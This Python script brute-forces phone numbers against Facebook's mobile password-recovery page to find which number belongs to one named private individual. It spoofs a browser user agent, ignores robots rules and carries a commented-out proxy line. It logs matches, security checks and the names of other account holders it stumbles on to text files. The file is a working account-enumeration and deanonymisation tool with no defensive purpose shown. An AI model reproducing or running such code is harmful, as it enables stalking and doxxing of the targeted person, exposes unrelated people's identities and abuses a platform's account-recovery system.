import mechanize
import time
import datetime
from bs4 import BeautifulSoup
service = '077'
end = '71'
keyname = 'Ashiya Dassanayake'

def search(number):
    browser = mechanize.Browser()
    #browser.set_proxies({"http": "45.55.27.246:8080"})
    browser.set_handle_robots(False)
    browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0')]
    browser.set_handle_refresh(False)

    url = 'https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&lwv=100&refid=8'
    browser.open(url)
    browser.select_form(nr = 0)       #This is login-password form -> nr = number = 0
    browser.form['email'] = number
    response = browser.submit()
    return response

def prase(response,phomnumber):
    isContinue = True
    soup = BeautifulSoup(response.read(), 'html.parser')
    title = soup.title.string
    if title == 'Reset Your Password':
        print('Account Found for')
        user = soup.body.findAll(text=keyname)
        if len(user):
            if user[0]== keyname:
                f=open("ashi99.txt", "a+")
                print ('******** \n\nAshi Find for '+phomnumber+'\n')
                f.write('Ashi find for '+phomnumber+'\n')
                isContinue = False
        else:
            ff=open("account.txt", "a+")
            nameDiv = soup.findAll("div", { "class" : "bi bj" })
            if len(nameDiv):
                ff.write(nameDiv[0].text.encode('utf8')+' Has Account but not Ash for'+phomnumber+'\n')
            else:
                ff.write('Has Account but not Ash for'+phomnumber+'\n')
    elif title == 'Security Check':
        ss=open("sec.txt", "a+")
        ss.write('Security Check for '+phomnumber+'\n')
        isContinue = False
        print('Security Check for '+phomnumber+'\n')
    else:
        fff=open("error.txt", "a+")
        fff.write('No Account Found for'+phomnumber+'\n')
    return isContinue

for mid in range(14198,20000):
    if mid == 0:
        mid = '00000'
    elif mid<10 :
        mid= '0000'+str(mid)
    elif mid < 100 :
        mid = '000'+str(mid)
    elif mid < 1000 :
        mid = '00'+str(mid)
    elif mid < 10000 :
        mid = '0'+str(mid)
    else:
        mid = str(mid)

    number = service+mid+end
    print 'Searching for '+number+'\n'
    res = search(number)
    isContinue = prase(res,number)
    #time.sleep(6)
    if isContinue == False :
        break
